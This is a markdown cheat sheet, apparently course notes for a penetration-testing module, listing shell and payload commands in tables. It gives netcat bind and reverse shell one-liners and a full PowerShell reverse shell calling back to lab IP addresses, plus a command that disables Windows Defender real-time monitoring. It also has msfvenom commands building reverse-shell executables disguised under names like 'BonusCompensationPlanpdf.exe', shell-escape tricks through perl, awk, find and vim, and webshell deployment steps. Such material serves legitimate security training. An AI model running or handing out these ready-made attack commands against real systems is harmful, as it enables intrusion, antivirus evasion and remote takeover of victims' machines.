# Shells & Payloads

### Anatomy of a Shell

|**Commands** |**Description**|
|---|---|
| `ps` | Shell Validation From 'ps' |
| `env` | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use |

### Bind Shells

|**Commands** |**Description**|
|---|---|
| `nc -lvnp 7777` | Server - Target starting Netcat listener |
| `nc -nv 10.129.41.200 7777` | Client - Attack box connecting to target |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f` | Server - Binding a Bash shell to the TCP session |
| `nc -nv 10.129.41.200 7777` | Client - Connecting to bind shell on target |

### Reverse Shells

|**Commands** |**Description**|
|---|---|
| `sudo nc -lvnp 443` | Server (attack box) |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | Client (target) -CMD |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Disabling anti virus/ Disabling AV -PWSH |

### Introduction to Payloads

|**Commands** |**Description**|
|---|---|
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc 10.10.14.12 7777 > /tmp/f` | Netcat/Bash Reverse Shell One-liner |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | Powershell One-liner |

### Crafting Payloads with MSFvenom

|**Commands** |**Description**|
|---|---|
| `msfvenom -l payloads` | List Payloads |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf` | Let's build a simple linux stageless payload with msfvenom |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe` | We can also use msfvenom to craft an executable (.exe) file that can be run on a Windows system to provide a shell. |
| `sudo nc -lvnp 443` | Listener |

### Spawning Interactive Shells

|**Commands** |**Description**|
|---|---|
| `/bin/sh -i` | This command will execute the shell interpreter specified in the path in interactive mode (-i). | 
| `perl —e 'exec "/bin/sh";'` | If the programming language Perl is present on the system, these commands will execute the shell interpreter specified. |
| `perl: exec "/bin/sh";` | Perl |
| `ruby: exec "/bin/sh"` | If the programming language Ruby is present on the system, this command will execute the shell interpreter specified: |
| `Lua: os.execute('/bin/sh')` | If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter specified using the full command |
| `awk 'BEGIN {system("/bin/sh")}'` | This is shown in the short awk script, It can also be used to spawn an interactive shell. | 
| `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | find can also be used to execute applications and invoke a shell interpreter. |
| `find . -exec /bin/sh \; -quit` | This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained. |
| `vim -c ':!/bin/sh'` | We can set the shell interpreter language from within the popular command-line-based text-editor VIM. |
| `ls -la <path/to/fileorbinary>` | We can also attempt to run this command to check what sudo permissions the account we landed on has |
| `sudo -l` | The sudo -l command above will need a stable interactive shell to run. If you are not in a full shell or sitting in an unstable shell, you may not get any return from it. |

### Laudanum, One Webshell To Rule Them All 

|**Commands** |**Description**|
|---|---|
| `cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx` | Move a Copy for Modification Laudanum Webshell |

### Antak Webshell

|**Commands** |**Description**|
|---|---|
| `cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx` | Move a Copy for Modification ANTAK WEBSHELL |
